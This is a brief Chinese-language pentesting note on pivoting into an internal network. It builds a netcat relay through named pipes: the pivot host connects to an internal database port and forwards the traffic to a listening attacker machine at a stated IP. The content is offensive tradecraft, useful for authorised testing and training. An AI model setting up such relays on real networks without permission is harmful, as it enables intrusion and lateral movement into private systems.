# 第一步：两端创建pipe in/out
pipe.in:发送
pipe.out:接受
# 第二步：攻击机本机监听目标端口，等待链接
cat pipe.out | nc -lvnp 3306 > pipe.in
以3306 db端口作为例子
# 第三步： pivot主机先连目标内网，再连攻击机
cat pipe.in | ./nc 172.18.0.2 3306 > pipe.out &
连接目标内网,&符号代表运行后将进程后台化
cat pipe.out | ./nc 192.168.172.227 6666 > pipe.in &
连接攻击机


pipe.in与Pipe.out里就是流动的字节流
需要同时在攻击机和pivot里通过以下命令创建Pipe.in 和pipe.out
```
mkfifo pipe.in pipe.out
```
连接成功后可以在终端尝试执行命令，验证是否链接成功